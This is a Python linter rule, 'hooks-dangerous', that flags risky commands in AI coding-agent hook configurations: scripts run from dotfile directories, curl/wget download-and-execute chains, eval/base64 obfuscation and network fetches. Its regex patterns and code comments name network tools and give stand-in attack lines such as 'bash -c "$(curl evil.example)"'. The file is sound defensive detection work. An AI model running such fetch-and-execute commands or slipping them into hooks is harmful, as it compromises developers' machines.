"""
Rule: hooks-dangerous

Flags hook commands that match dangerous patterns: executing scripts from
dotfile directories, download-and-execute, obfuscation, and suspicious
runtimes or network access.
"""

import re
from typing import Dict, List

from skillsaw.diagnostics import safe_display
from skillsaw.rule import Rule, RuleViolation, Severity
from skillsaw.context import RepositoryContext
from skillsaw.rules.builtin.content_analysis import (
    AgentBlock,
    CursorHooksBlock,
    HookEventConfig,
    HooksBlock,
    SettingsBlock,
    SkillBlock,
)

_INTERPRETERS = r"(?:node|bun|deno|python[23]?|ruby|perl|php|bash|sh|zsh|dash)"
_INTERPRETER_CMD = rf"(?:(?:\S+/)?env\s+)?(?:\S+/)?{_INTERPRETERS}"
_SUDO = r"(?:sudo\s+)?"
_DOTFILE_DIRS = r"\.(?:claude|vscode|cursor|codex|github|windsurf)"

# What separates one command from the next. A newline is a separator every
# shell honours, and hook commands arrive as JSON strings where a multi-line
# script is ordinary — `"echo ok\ncurl evil.example"` runs the fetch, so
# omitting it would leave everything past the first line unscanned. A single
# `&` backgrounds the command before it and runs the next
# (`echo ready & curl evil`), so it is a boundary too — listed after `&&` in
# the alternation so the two-character operator is tried first and a real
# `&&` chain is never split into two bare-`&` boundaries. `(` opens a
# subshell or substitution whose body runs in the same shell context
# (`bash -c "$(curl evil.example)"`), so it bounds a command as well.
# Over-splitting a `2>&1` redirect only scans more, never less — the safe
# direction.
_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|\()"

_SCRIPT_FROM_DOTFILES_RE = re.compile(
    rf"""{_CMD_BOUNDARY}\s*
        {_SUDO}                              # optional sudo
        (?:{_INTERPRETER_CMD})\s+(?:run\s+)? # interpreter [run]
        (?:\S+/)?{_DOTFILE_DIRS}/\S+         # path under dotfile dir
    """,
    re.VERBOSE,
)

_DOWNLOAD_TOOL_RE = re.compile(r"\b(?:curl|wget)\b")
# A fetch wrapped in process or command substitution feeds an interpreter
# directly — `bash <(curl …)`, `bash -c "$(curl …)"` — with no shell
# separator between the download and the interpreter, so the substitution
# form is a download signal in its own right.
_SUBSTITUTION_FETCH_RE = re.compile(
    rf"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
        |`(?:sudo\s+)?(?:curl|wget|nc|ncat)\b          # `curl …`
    """,
    re.VERBOSE,
)
# The same boundary set as _CMD_BOUNDARY, so the tokenizer and the anchored
# patterns in this module cannot drift: `||` is one operator (splitting on
# bare `|` alone used to leave an empty middle segment that masqueraded as a
# pipe), and a single `&` backgrounds and runs the next command.
_SHELL_SEPARATOR_RE = re.compile(r"(&&|\|\||;|\||&)")
_PIPE_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\b")
_CHAIN_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\s+\S+")

_OBFUSCATION_RE = re.compile(
    r"""
        \beval\s+["\$(\`]                      # eval with expansion
        |base64\s+(?:-d|--decode)              # base64 decode
    """,
    re.VERBOSE,
)

_BUN_RE = re.compile(rf"{_CMD_BOUNDARY}\s*{_SUDO}(?:\S+/)?bun\s+(?:run\s+)?\S+")

_NETWORK_FETCH_RE = re.compile(rf"{_CMD_BOUNDARY}\s*{_SUDO}(?:curl|wget|nc|ncat)\b")


def _downloads_and_executes(command: str) -> bool:
    """Whether a download feeds or precedes an interpreter, in linear time."""
    # The former unanchored ``curl.*`` patterns restarted a suffix scan at
    # every repeated token. Tokenize shell separators once instead. Newlines
    # reset the chain because the original regex deliberately did not span
    # them; each line is still scanned independently by the network rule.
    #
    # Carry rules mirror the shell: a download stays live across any number
    # of pipes because every stage consumes the previous stage's output, but
    # across ``&&``/``;``/``&`` only an interpreter directly after the
    # download pairs with it — in ``curl url; cat notes | python -`` the
    # interpreter reads local files, not the download. Nothing crosses
    # ``||``: its right side runs only when the download failed.
    for line in command.split("\n"):
        pieces = _SHELL_SEPARATOR_RE.split(line)
        piped_download = False
        chained_download = False
        for index in range(0, len(pieces), 2):
            via_pipe = False
            via_chain = False
            if index:
                separator = pieces[index - 1]
                if separator == "|":
                    via_pipe = piped_download
                elif separator != "||":  # "&&", ";", "&"
                    via_chain = chained_download
            segment = pieces[index]
            if not segment.strip():
                continue
            segment_downloads = (
                _DOWNLOAD_TOOL_RE.search(segment) is not None
                or _SUBSTITUTION_FETCH_RE.search(segment) is not None
            )
            if segment_downloads and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
            if via_pipe and _PIPE_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            if via_chain and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            piped_download = via_pipe or segment_downloads
            chained_download = segment_downloads
    return False


def dangerous_command_descriptions(command: str) -> List[str]:
    """Return messages for dangerous patterns in a command."""
    findings: List[str] = []

    if _SCRIPT_FROM_DOTFILES_RE.search(command):
        findings.append("executes a script from a dotfile directory")

    if _downloads_and_executes(command):
        findings.append("downloads and executes remote code")

    if _OBFUSCATION_RE.search(command):
        findings.append("uses obfuscation techniques (eval/base64)")

    if not findings and _BUN_RE.search(command):
        findings.append("uses bun runtime (uncommon in hooks, verify intent)")

    if not findings and _NETWORK_FETCH_RE.search(command):
        findings.append("performs network requests (verify intent)")

    return findings


class HooksDangerousRule(Rule):
    """Flag hook commands matching dangerous patterns."""

    since = "0.12.0"

    config_schema = {
        "allowlist": {
            "type": "list",
            "default": [],
            "description": "Hook commands to permit (exact match)",
        },
    }

    @property
    def rule_id(self) -> str:
        return "hooks-dangerous"

    @property
    def description(self) -> str:
        return (
            "Flags hook commands that execute scripts from dotfile directories, "
            "download-and-execute chains (curl|sh), obfuscation (eval/base64), "
            "or perform network requests"
        )

    def default_severity(self) -> Severity:
        return Severity.ERROR

    def _is_allowed(self, command: str) -> bool:
        allowlist = self.config.get("allowlist", [])
        return any(command == entry for entry in allowlist)

    def _check_events(
        self,
        events: Dict[str, List[HookEventConfig]],
        file_path,
        line=None,
    ) -> List[RuleViolation]:
        violations = []
        for event_type, configs in events.items():
            for cfg in configs:
                for handler in cfg.handlers:
                    if handler.type != "command" or not handler.command:
                        continue
                    # Exec-form hooks split the invocation across command +
                    # args; scan the joined form so patterns can't hide in args.
                    command = handler.command
                    if isinstance(handler.args, list):
                        command = " ".join([command, *(str(a) for a in handler.args)])
                    if self._is_allowed(handler.command) or self._is_allowed(command):
                        continue
                    for message in dangerous_command_descriptions(command):
                        violations.append(
                            self.violation(
                                f"Hook {safe_display(event_type)}: {message} — "
                                f"command: {safe_display(command)!r}",
                                file_path=file_path,
                                line=line,
                            )
                        )
        return violations

    def check(self, context: RepositoryContext) -> List[RuleViolation]:
        violations = []

        # CursorHooksBlock renders its flatter shape as HookEventConfig too.
        hook_blocks = context.lint_tree.find(HooksBlock) + context.lint_tree.find(CursorHooksBlock)
        for block in hook_blocks:
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.events, block.path))

        for block in context.lint_tree.find(SettingsBlock):
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.hooks_events, block.path))

        # Skill and agent frontmatter can declare hooks with the same schema —
        # a checked-in, shareable command-execution vector.
        for block in context.lint_tree.find(SkillBlock) + context.lint_tree.find(AgentBlock):
            if block.frontmatter_error:
                continue
            events = block.hooks_events
            if events:
                violations.extend(
                    self._check_events(events, block.path, line=block.key_line("hooks"))
                )

        return violations
